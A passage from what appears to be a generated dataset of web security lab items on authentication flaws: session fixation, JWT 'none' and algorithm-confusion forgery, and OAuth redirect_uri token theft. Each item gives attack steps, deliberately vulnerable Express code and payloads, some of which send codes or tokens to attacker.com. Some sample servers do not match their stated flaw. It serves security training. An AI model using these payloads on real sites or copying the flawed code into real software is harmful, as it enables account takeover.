    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to spider the app and discover that the session ID is passed as a URL parameter (/login?session=).",
      "Manually supply a predictable value for the session parameter during your own login and confirm it persists across requests.",
      "Send Carlos a crafted phishing link containing your chosen session ID and wait for the session to become valid.",
      "Once Carlos logs in, reuse the crafted session token to access /my-dashboard.",
      "Validate success by accessing the page and confirming Carlos's personalized content."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.use(require('cookie-parser')()); const sessions = {}; app.get('/login', (req, res) => { let session = req.query.session || Math.random().toString(36).substring(2); res.cookie('session', session); res.send('Session initiated'); }); app.post('/authenticate', (req, res) => { const session = req.cookies.session; const { username } = req.body; if (username === 'carlos') { sessions[session] = username; res.send('Logged in'); } else { res.status(401).send('Invalid user'); } }); app.get('/my-dashboard', (req, res) => { const session = req.cookies.session; if (sessions[session] === 'carlos') { res.send('Carlos Dashboard Access'); } else { res.status(403).send('Access Denied'); } }); app.listen(5050);",
    "payloads": [
      "/login?session=attacker123",
      "Cookie: session=attacker123",
      "Injected phishing link: https://victimsite.com/login?session=attacker123"
    ]
  },
  {
    "Lab scenario": "JWT None Algorithm Bypass in Authentication Header",
    "Lab Description": "This application uses JWT for user authentication but does not properly validate the signature algorithm. If the token's 'alg' field is set to 'none', the server skips verification. To solve: craft a token with 'alg':'none' and 'username':'carlos' and access /account.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Intercept an existing Authorization Bearer token using Burp Suite.",
      "Modify the JWT header to set 'alg' to 'none' and remove the signature part.",
      "Set the payload to {\"username\":\"carlos\"} using any JWT generator.",
      "Send the forged token in the Authorization header to /account using Postman.",
      "Confirm successful login by accessing Carlos's account page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('body-parser').json()); app.get('/account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.decode(token); if (decoded.username === 'carlos') { res.send('Welcome back Carlos!'); } else { res.status(403).send('Access Denied'); } } catch { res.status(400).send('Invalid token'); } }); app.listen(5051);",
    "payloads": [
      "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
      "Payload: {\"username\":\"carlos\"}",
      "Unsigned JWT: [Base64(header)].[Base64(payload)]."
    ]
  },
  {
    "Lab scenario": "OAuth Authorization Code Interception via Open Redirect",
    "Lab Description": "This OAuth implementation allows arbitrary redirection of authorization codes to third-party sites through the vulnerable 'redirect_uri' parameter. The server fails to validate the host. To solve: capture Carlos's authorization code and exchange it for an access token.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to modify the 'redirect_uri' during your own OAuth login to confirm that external domains are accepted.",
      "Send Carlos a phishing link with the crafted redirect_uri pointing to your controlled server.",
      "Use a simple HTTP server to capture the redirected request and extract the authorization code.",
      "Exchange the intercepted code for an access token using Postman with a POST request to /oauth/token.",
      "Use the token to access /protected and confirm Carlos's user profile data is displayed."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/authorize', (req, res) => { const redirectUri = req.query.redirect_uri; const code = 'authcode-carlos'; res.redirect(`${redirectUri}?code=${code}`); }); app.post('/oauth/token', (req, res) => { const { code } = req.body; if (code === 'authcode-carlos') { res.json({ access_token: 'access-token-carlos' }); } else { res.status(400).json({ error: 'Invalid code' }); } }); app.get('/protected', (req, res) => { const authHeader = req.headers.authorization; if (authHeader === 'Bearer access-token-carlos') { res.send('Carlos Protected Content'); } else { res.status(401).send('Unauthorized'); } }); app.listen(5052);",
    "payloads": [
      "https://vulnerable-app.com/authorize?redirect_uri=http://attacker.com",
      "POST /oauth/token {\"code\":\"authcode-carlos\"}",
      "Authorization: Bearer access-token-carlos"
    ]
  },
  {
    "Lab scenario": "JWT token signature confusion vulnerability in API authentication",
    "Lab Description": "This lab uses JSON Web Tokens to secure user sessions. The backend mistakenly trusts tokens signed with both HMAC and RSA keys depending on the 'alg' field, which makes it possible to craft a valid token using the public key as an HMAC secret. To solve: forge a token with admin privileges using algorithm confusion and access the /admin endpoint.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the login JWT using Burp Suite and note the header specifies 'RS256' algorithm.",
      "Extract the public key from the application or its .well-known/jwks.json endpoint.",
      "Craft a new JWT header with 'alg' set to 'HS256' and use the public key as the HMAC secret to sign it.",
      "Modify the payload to {\"username\":\"carlos\",\"role\":\"admin\"} and submit the token via Postman to /admin.",
      "Verify admin-level access by confirming the /admin endpoint responds with sensitive data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); const publicKey = fs.readFileSync('./public.pem'); app.use(require('body-parser').json()); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, publicKey); if (decoded.role === 'admin') { res.send('Sensitive admin data for carlos'); } else { res.status(403).send('Access Denied'); } } catch (e) { res.status(400).send('Invalid token'); } }); app.listen(6001);",
    "payloads": [
      "Header: {\"alg\":\"HS256\",\"typ\":\"JWT\"}",
      "Payload: {\"username\":\"carlos\",\"role\":\"admin\"}",
      "Signature: HMAC(publicKey, base64Url(header) + '.' + base64Url(payload))"
    ]
  },
  {
    "Lab scenario": "Session fixation via unvalidated 'session_id' in OAuth callback flow",
    "Lab Description": "This OAuth-enabled app accepts a 'session_id' from the user during the authorization flow, which it reuses to bind the session after token exchange without validation. To solve: inject a fixed session ID and access Carlos's authenticated session after his login completes.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to observe the 'session_id' parameter being passed in the OAuth callback flow.",
      "Manually alter the 'session_id' in the authorization request to a known value (e.g., 'attackersession').",
      "Send Carlos a phishing link that includes the 'session_id=attackersession' parameter.",
      "After Carlos authenticates, reuse the 'attackersession' cookie to access /profile as Carlos.",
      "Confirm compromise by seeing Carlos's profile data on the /profile page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/oauth/callback', (req, res) => { const sessionId = req.query.session_id; const code = req.query.code; if (code === 'authcode-carlos') { res.cookie('session_id', sessionId); res.send('OAuth login successful'); } else { res.status(401).send('Invalid code'); } }); app.get('/profile', (req, res) => { if (req.cookies.session_id === 'attackersession') { res.send('Carlos profile data exposed'); } else { res.status(403).send('Access Denied'); } }); app.listen(6002);",
    "payloads": [
      "/oauth/callback?session_id=attackersession&code=authcode-carlos",
      "Cookie: session_id=attackersession",
      "Phishing link: https://target.com/oauth/authorize?session_id=attackersession"
    ]
  },
  {
    "Lab scenario": "Improper OAuth scope validation in REST API Authorization Flow",
    "Lab Description": "This lab uses OAuth to authorize API access. The backend trusts the client-provided scope without verifying it server-side, allowing privilege escalation by modifying the scope parameter. To solve: request an access token with elevated scope 'admin' and use it to access /admin/data.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Burp Suite to intercept the OAuth authorization request and locate the 'scope' parameter.",
      "Modify the 'scope' to include 'admin' before submitting the request.",
      "Exchange the authorization code for a token at /oauth/token using Postman.",
      "Use the new token to access /admin/data endpoint.",
      "Confirm the lab is solved when admin-level sensitive data is displayed."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.use(require('body-parser').json()); app.post('/oauth/token', (req, res) => { const { code, scope } = req.body; if (code === 'valid-auth-code') { res.json({ access_token: 'token-for-' + scope }); } else { res.status(400).json({ error: 'Invalid code' }); } }); app.get('/admin/data', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'token-for-admin') { res.send('Admin level confidential data'); } else { res.status(403).send('Forbidden'); } }); app.listen(6003);",
    "payloads": [
      "scope=admin",
      "POST /oauth/token {\"code\":\"valid-auth-code\",\"scope\":\"admin\"}",
      "Authorization: Bearer token-for-admin"
    ]
  },
  {
    "Lab scenario": "Session fixation vulnerability in cookie-based login",
    "Lab Description": "The application assigns session IDs before authentication and does not regenerate them upon successful login. This allows an attacker to set a session ID, trick a victim into using it, and hijack the account after login. To solve: fix the session ID, log in as the victim using the same session ID, and access their private dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to observe the Set-Cookie header during unauthenticated navigation to /login.",
      "Manually fix the session ID by forcing the same cookie value before authentication.",
      "Trick Carlos into logging in via a phishing link that uses the predefined session ID.",
      "Reuse the same session ID cookie to access /dashboard after Carlos logs in.",
      "Verify the takeover by confirming the /dashboard page shows Carlos's private data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'hunter2' }]; app.get('/login', (req, res) => { if (!req.cookies.sessionid) { res.cookie('sessionid', Math.random().toString(36).substr(2)); } res.send('Login page'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users.find(u => u.username === username && u.password === password)) { res.send('Logged in as ' + username); } else { res.status(401).send('Invalid credentials'); } }); app.get('/dashboard', (req, res) => { if (req.cookies.sessionid === 'fixedsessionid') { res.send('Welcome Carlos, your sensitive data is here.'); } else { res.status(403).send('Access denied.'); } }); app.listen(7001);",
    "payloads": [
      "Cookie: sessionid=fixedsessionid",
      "Phishing URL: http://target.com/login?sessionid=fixedsessionid",
      "Hijack Access: GET /dashboard with Cookie: sessionid=fixedsessionid"
    ]
  },
  {
    "Lab scenario": "JWT tampering due to missing signature verification",
    "Lab Description": "The application accepts JWT tokens for authentication but does not verify their signatures due to a misconfigured token parser. This allows an attacker to forge arbitrary tokens and impersonate other users. To solve: craft a JWT token with the payload for 'admin' access and submit it to /admin-panel.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Capture the login JWT token using Burp Suite.",
      "Notice the lack of signature validation by modifying the token payload and observing unchanged server behavior.",
      "Craft a new JWT token with payload: {\"user\":\"carlos\",\"role\":\"admin\"} and leave the signature empty.",
      "Send the forged token in the Authorization header to the /admin-panel endpoint.",
      "Confirm the lab is solved when admin data for Carlos is shown."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('body-parser').json()); app.get('/admin-panel', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (decoded.role === 'admin') { res.send('Admin panel for carlos'); } else { res.status(403).send('Access Denied'); } }); app.listen(7002);",
    "payloads": [
      "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
      "Payload: {\"user\":\"carlos\",\"role\":\"admin\"}",
      "Signature: (empty)"
    ]
  },
  {
    "Lab scenario": "OAuth implicit flow misconfiguration allows token interception",
    "Lab Description": "The app uses OAuth's implicit grant flow with tokens exposed in the URL fragment, which is accessible to malicious scripts due to the lack of proper CSP headers. To solve: steal the access token via a crafted JavaScript payload and use it to access /api/userinfo as Carlos.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Using Burp Suite, observe the redirect URI contains the access token in the URL fragment.",
      "Inject a malicious JavaScript payload via the referer parameter in the OAuth request.",
      "Host a script that captures window.location.hash and exfiltrates the access token to your server.",
      "Replay the intercepted token to /api/userinfo using Postman.",
      "Confirm the lab is solved by retrieving Carlos's private profile from the endpoint."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.use(require('body-parser').json()); app.get('/oauth/authorize', (req, res) => { const redirectUri = req.query.redirect_uri; const token = 'access-token-for-carlos'; res.redirect(redirectUri + '#access_token=' + token); }); app.get('/api/userinfo', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'access-token-for-carlos') { res.send('Private data for carlos'); } else { res.status(403).send('Access Denied'); } }); app.listen(7003);",
    "payloads": [
      "Malicious Redirect: http://attacker.com/capture#access_token=",
      "JavaScript Snippet: window.location.hash.split('=')[1]",
      "Authorization: Bearer access-token-for-carlos"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion attack in token verification logic",
    "Lab Description": "The application uses JWT for authentication but incorrectly trusts the algorithm specified in the token header. This allows an attacker to switch from HMAC to 'none' algorithm and forge tokens. To solve: manipulate the JWT header to use 'none', craft a valid admin payload, and access the protected /admin route.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Burp Suite to intercept the login request and retrieve the issued JWT token.",
      "Modify the JWT header to set 'alg' to 'none' and observe if the backend accepts the unsigned token.",
      "Create a new token with payload {\"user\":\"carlos\",\"role\":\"admin\"} and leave the signature blank.",
      "Send the forged token in an Authorization: Bearer header to /admin.",
      "Access the admin dashboard and confirm the lab is solved by reading Carlos's sensitive data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const jwt = require('jsonwebtoken'); app.use(require('body-parser').json()); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.payload.role === 'admin') { res.send('Welcome Admin Carlos!'); } else { res.status(403).send('Access Denied'); } }); app.listen(5000);",
    "payloads": [
      "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
      "Payload: {\"user\":\"carlos\",\"role\":\"admin\"}",
      "Signature: (empty)"
    ]
  },
  {
    "Lab scenario": "Session fixation via static session token in GraphQL mutation",
    "Lab Description": "The application uses GraphQL for authentication but assigns a session token before login that is not regenerated post-login. This allows an attacker to predefine a token, send it to the victim, and hijack their session once the victim logs in. To solve: fix a session token, hijack the user's session, and access the profile endpoint.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to monitor the GraphQL /graphql endpoint and note that the 'session' cookie is assigned on initial contact.",
      "Send a GraphQL mutation with your fixed session cookie and observe it persists after login.",
      "Send the fixed session link to Carlos and wait for him to log in.",
      "After Carlos authenticates, reuse the same fixed session cookie and access /graphql to query for { user { profile } }.",
      "Confirm that Carlos's profile data is retrieved using the fixed session token."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.use(require('express-graphql')({ schema: require('graphql').buildSchema('type Query { profile: String }'), rootValue: { profile: () => 'User: Carlos profile data' }, graphiql: true })); app.use((req, res, next) => { if (!req.cookies.session) res.cookie('session', 'static-session-id'); next(); }); app.listen(5001);",
    "payloads": [
      "Cookie: session=static-session-id",
      "GraphQL Query: { user { profile } }",
      "Phishing Link: http://target.com/graphql?session=static-session-id"
    ]
  },
  {
    "Lab scenario": "OAuth open redirect token theft in redirect_uri validation",
    "Lab Description": "The application uses OAuth authorization but fails to properly validate the redirect_uri parameter, allowing attackers to steal tokens via an open redirect. To solve: craft a malicious redirect_uri pointing to your controlled server, extract Carlos's token, and access /userinfo using it.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Using Burp Suite, intercept the OAuth authorization flow and note that redirect_uri is insufficiently validated.",
      "Modify the redirect_uri parameter to use your attacker-controlled domain.",
      "Deploy a malicious server to capture the token fragment via window.location.hash.",
      "Use Postman to send an Authorization header with the stolen token to /userinfo.",
      "Confirm the lab is solved when Carlos's personal user information is displayed."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.use(require('body-parser').json()); app.get('/oauth/authorize', (req, res) => { const token = 'carlos-oauth-token'; const redirectUri = req.query.redirect_uri; res.redirect(redirectUri + '#access_token=' + token); }); app.get('/userinfo', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'carlos-oauth-token') { res.send('Sensitive profile data for Carlos'); } else { res.status(403).send('Unauthorized'); } }); app.listen(5002);",
    "payloads": [
      "redirect_uri=http://attacker.com/capture",
      "JavaScript: window.location.hash.split('=')[1]",
      "Authorization: Bearer carlos-oauth-token"
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session IDs in REST login flow",
    "Lab Description": "The application issues session IDs before user authentication, and these tokens are not regenerated upon successful login. This lets an attacker pre-fixate a session token, send it to a victim, and hijack their authenticated session. To solve: pre-assign a session ID, trick the victim to log in with it, and access the /dashboard endpoint.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Using Burp Suite, intercept the GET /login request and observe the server sets a session cookie before login.",
      "Confirm that the session remains unchanged after successful login.",
      "Manually set the session cookie to a fixed value in Burp Repeater and send a phishing link to the victim.",
      "Once the victim logs in using the fixated session ID, reuse this same session cookie in your browser.",
      "Access the /dashboard endpoint and confirm successful access to the victim's account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.use((req, res, next) => { if (!req.cookies.sessionID) res.cookie('sessionID', 'sess-' + Date.now()); next(); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'carlos' && password === 'qwerty') { res.send('Login successful'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/dashboard', (req, res) => { if (req.cookies.sessionID) res.send('Welcome to Carlos's Dashboard'); else res.status(401).send('Please login'); }); app.listen(4005);",
    "payloads": [
      "sessionID=sess-1713456700",
      "Login credentials: username=carlos&password=qwerty",
      "Reuse sessionID in subsequent requests"
    ]
  },
  {
    "Lab scenario": "JWT secret key disclosure via verbose error logging in token validation",
    "Lab Description": "The application uses a poorly configured JWT validation library that leaks internal errors to the client, exposing the secret signing key when token verification fails. To solve: submit a malformed token, extract the secret from the error response, craft a valid admin token, and access /admin-panel.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Using Postman, send a deliberately corrupted JWT token in the Authorization header and inspect the HTTP response.",
      "Note the verbose error revealing the secret key used for HMAC signature validation.",
      "Rebuild a valid JWT with payload {\"user\":\"carlos\",\"role\":\"admin\"} and sign it using the disclosed secret.",
      "Submit the signed token as a Bearer token in a request to /admin-panel.",
      "Confirm successful admin access when Carlos's admin dashboard is displayed."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('body-parser').json()); const secret = 'SuperSecretSigningKey'; app.get('/admin-panel', (req, res) => { try { const token = req.headers.authorization.split(' ')[1]; const decoded = jwt.verify(token, secret); if (decoded.role === 'admin') res.send('Welcome to Carlos's Admin Panel'); else res.status(403).send('Forbidden'); } catch (e) { res.status(500).send(`Error: ${e.message}`); } }); app.listen(4010);",
    "payloads": [
      "Malformed token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.payload",
      "{\"alg\":\"HS256\",\"typ\":\"JWT\"}",
      "{\"user\":\"carlos\",\"role\":\"admin\"} signed with SuperSecretSigningKey"
    ]
  },
  {
    "Lab scenario": "OAuth implicit flow token leakage via referer header mismanagement",
    "Lab Description": "The application implements OAuth implicit flow but fails to clear the referer header after redirection, leaking the access token to third-party domains. To solve: intercept the Referer header after redirection to extract the victim's token, use it to access /user/settings.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Using Burp Suite, monitor HTTP requests during the OAuth implicit flow and note that the access token is appended to the redirect URL fragment.",
      "Deploy a controlled page with an embedded image or link pointing to the vulnerable redirect endpoint.",
      "Force the victim to click this crafted link so their access token is exposed via the Referer header to your server.",
      "Extract the token from your server logs and use Postman to send it as an Authorization Bearer token to /user/settings.",
      "Confirm access to Carlos's settings to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/auth/authorize', (req, res) => { const token = 'access-token-for-carlos'; res.redirect(`${req.query.redirect_uri}#access_token=${token}`); }); app.get('/user/settings', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'access-token-for-carlos') res.send('Carlos's User Settings'); else res.status(401).send('Unauthorized'); }); app.listen(4020);",
    "payloads": [
      "Phishing link: http://vulnerable-app.com/auth/authorize?redirect_uri=http://attacker.com/callback",
      "Referer Header: http://attacker.com/callback#access_token=access-token-for-carlos",
      "Authorization: Bearer access-token-for-carlos"
    ]
  },
  {
    "Lab scenario": "Session mismanagement via insecure logout endpoint",
    "Lab Description": "The application's logout function fails to invalidate session cookies on the server, allowing attackers to reuse a hijacked token. The application continues to trust old session cookies even after the user logs out. To solve: capture the session cookie pre-logout and reuse it to access /account/profile after the user logs out.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "With Burp Suite running, intercept your own login request and capture the Set-Cookie header for the session.",
      "Log out from the application and note the server does not invalidate the cookie on logout.",
      "Replay the original session cookie manually via Burp Repeater to confirm the session is still active.",
      "Inject the session cookie into a browser's cookie store and refresh /account/profile.",
      "Verify that the page loads with authenticated user content, solving the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; app.post('/login', (req, res) => { const sessionId = 'sess_' + Math.random().toString(36).substring(2); sessions[sessionId] = { user: 'carlos' }; res.cookie('session', sessionId); res.send('Logged in'); }); app.post('/logout', (req, res) => { res.send('Logged out'); }); app.get('/account/profile', (req, res) => { const sessionId = req.cookies.session; if (sessions[sessionId]) { res.send(`User profile for ${sessions[sessionId].user}`); } else { res.status(403).send('Unauthorized'); } }); app.listen(4500);",
    "payloads": [
      "Cookie: session=sess_example_hijack_value",
      "/account/profile endpoint access with the reused cookie"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion vulnerability in token verification logic",
    "Lab Description": "The application uses a JWT library that allows switching between asymmetric (RS256) and symmetric (HS256) algorithms without proper validation, enabling attackers to forge tokens with HS256 using the public key as the secret. To solve: download the public key, sign a malicious admin token using HS256, and access /admin/dashboard.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to observe the JWT token in the Authorization header during login and note the alg parameter set to RS256.",
      "Download the server's exposed public key from /public.pem.",
      "Craft a new JWT with {\"user\":\"carlos\",\"role\":\"admin\"} and change the alg field to HS256.",
      "Sign the new token using the public key as the secret and inject it into the Authorization header.",
      "Send the request to /admin/dashboard and verify administrative access to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); const publicKey = fs.readFileSync('public.pem'); app.use(require('body-parser').json()); app.get('/admin/dashboard', (req, res) => { try { const token = req.headers.authorization.split(' ')[1]; const decoded = jwt.verify(token, publicKey, { algorithms: ['RS256', 'HS256'] }); if (decoded.role === 'admin') res.send('Welcome Admin Carlos!'); else res.status(403).send('Access denied'); } catch (err) { res.status(500).send(err.message); } }); app.listen(4600);",
    "payloads": [
      "JWT Header: {\"alg\":\"HS256\",\"typ\":\"JWT\"}",
      "JWT Payload: {\"user\":\"carlos\",\"role\":\"admin\"}",
      "Secret Key: public.pem contents used as HMAC secret"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration leading to authorization code reuse",
    "Lab Description": "The application uses OAuth 2.0 Authorization Code flow but does not invalidate the authorization code after the first use, allowing reuse for session hijacking. The application [accepts stale codes]. To solve: intercept the authorization code, reuse it for a second login attempt to access /user/dashboard as Carlos.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Using Burp Suite, intercept the OAuth authorization process and capture the authorization code parameter from the redirect.",
      "Allow the victim to use the code once and confirm the login succeeds.",
      "Reuse the same authorization code in a second crafted POST /oauth/token request.",
      "Exchange the code for a valid access token, despite it being reused.",
      "Use the token to access /user/dashboard and confirm the lab is solved."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const tokens = {}; app.get('/oauth/authorize', (req, res) => { const code = 'authcode1234'; res.redirect(`${req.query.redirect_uri}?code=${code}`); }); app.post('/oauth/token', (req, res) => { const { code } = req.body; if (code === 'authcode1234') { res.json({ access_token: 'reusable-token' }); } else { res.status(400).send('Invalid code'); } }); app.get('/user/dashboard', (req, res) => { if (req.headers.authorization === 'Bearer reusable-token') { res.send('Carlos's Dashboard Loaded'); } else { res.status(403).send('Unauthorized'); } }); app.listen(4700);",
    "payloads": [
      "Authorization Code: authcode1234",
      "Access Token: Bearer reusable-token",
      "Endpoint: /user/dashboard"
    ]
  },
  {
    "Lab scenario": "Session Fixation Attack in Cookie Assignment",
    "Lab Description": "The application is vulnerable to session fixation because it accepts and trusts user-provided session IDs without regenerating them upon login. The application assigns the session ID based on the `session` cookie and never invalidates it post-authentication. To solve: set a known session ID, perform a login as yourself, and then reuse the fixed session ID to hijack Carlos's session.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept a GET /login page request and manually inject a crafted `session` cookie like `session=attacker-session`.",
      "Submit valid login credentials with the crafted session ID still set and observe that the server accepts it unchanged.",
      "Log out and attempt to reuse the same `session` value `attacker-session` in a new request to /my-account.",
      "Send a credential stuffing attack using the same `session` cookie for Carlos's credentials.",
      "Verify that the server authenticates the session and grants access to Carlos's /my-account page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = { carlos: 'supersecret' }; const sessions = {}; app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\" type=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { sessions[req.cookies.session] = username; res.send('Logged in'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const username = sessions[req.cookies.session]; if (username) { res.send(`Welcome ${username}`); } else { res.status(403).send('Unauthorized'); } }); app.listen(4100);",
    "payloads": [
      "Cookie: session=attacker-session",
      "POST body: username=carlos&password=supersecret",
      "GET /my-account with Cookie: session=attacker-session"
    ]
  },
  {
    "Lab scenario": "JWT none algorithm attack in Token Validation",
    "Lab Description": "The application's JWT implementation does not properly enforce the algorithm check and accepts tokens signed with the `none` algorithm, bypassing signature verification. The application uses this token to control user access levels. To solve: modify the token to use `alg=none` and set `admin=true` to gain administrative privileges.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Capture a legitimate JWT token using Burp Suite from the Authorization header after logging in.",
      "Decode the JWT using jwt.io and modify the header to `{ \"alg\": \"none\" }`.",
      "Edit the payload to `{ \"username\": \"carlos\", \"admin\": true }`.",
      "Remove the signature and send the token in an Authorization header as a Bearer token.",
      "Access /admin-panel and confirm you have administrative privileges, solving the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('body-parser').json()); app.get('/admin-panel', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, 'super-secret', { algorithms: ['HS256', 'none'] }); if (decoded.admin) res.send('Admin Access Granted'); else res.status(403).send('Access Denied'); } catch (e) { res.status(401).send('Invalid token'); } }); app.listen(4200);",
    "payloads": [
      "JWT Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
      "JWT Payload: {\"username\":\"carlos\",\"admin\":true}",
      "Final JWT: eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsImFkbWluIjp0cnVlfQ."
    ]
  },
  {
    "Lab scenario": "OAuth Token Misuse in Redirect URI Trust",
    "Lab Description": "The OAuth server in this lab improperly trusts wildcards in redirect URIs, allowing attackers to exfiltrate authorization codes to an external malicious domain. The application [uses a poorly validated wildcard match]. To solve: exploit the redirect URI to leak Carlos's code and reuse it to obtain his access token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Using Burp Suite, initiate an OAuth login and note the redirect_uri parameter allows wildcards like `https://yourdomain.com/*`.",
      "Craft a malicious URL replacing the subpath with your controlled server `https://yourdomain.com.attacker.com/callback`.",
      "Send the link to Carlos (assume social engineering or XSS) and wait for him to authorize the app.",
      "Capture the leaked code in your server logs and exchange it for an access token at `/oauth/token`.",
      "Use the token to call `/user/dashboard` as Carlos and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const validCodes = {}; app.get('/oauth/authorize', (req, res) => { const code = 'authcode-carlos'; validCodes[code] = req.query.redirect_uri; res.redirect(`${req.query.redirect_uri}?code=${code}`); }); app.post('/oauth/token', (req, res) => { const { code } = req.body; if (validCodes[code]) { res.json({ access_token: 'token-for-carlos' }); } else { res.status(400).send('Invalid code'); } }); app.get('/user/dashboard', (req, res) => { if (req.headers.authorization === 'Bearer token-for-carlos') { res.send('Carlos Dashboard Loaded'); } else { res.status(403).send('Unauthorized'); } }); app.listen(4300);",
    "payloads": [
      "Malicious Redirect URI: https://yourdomain.com.attacker.com/callback",
      "Intercepted Auth Code: authcode-carlos",
      "Access Token: Bearer token-for-carlos"
    ]
  },
  {
    "Lab scenario": "Session fixation in login redirect flow",
    "Lab Description": "The login flow does not regenerate session tokens upon authentication, allowing an attacker to fixate a session ID for a victim. The application fails to invalidate existing session tokens during login. To solve: hijack Carlos's session after login using a fixed session ID.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept a GET /login request and inspect the Set-Cookie header for session ID",
      "Inject the fixed session ID into the victim's browser via phishing or stored XSS in a comment section",
      "Wait for Carlos to log in using the pre-set session ID",
      "Access the account page using the same session ID to confirm session hijacking",
      "Verify by visiting /my-account with the stolen session cookie"
    ],
    "Vulnerability name": "Authentication",
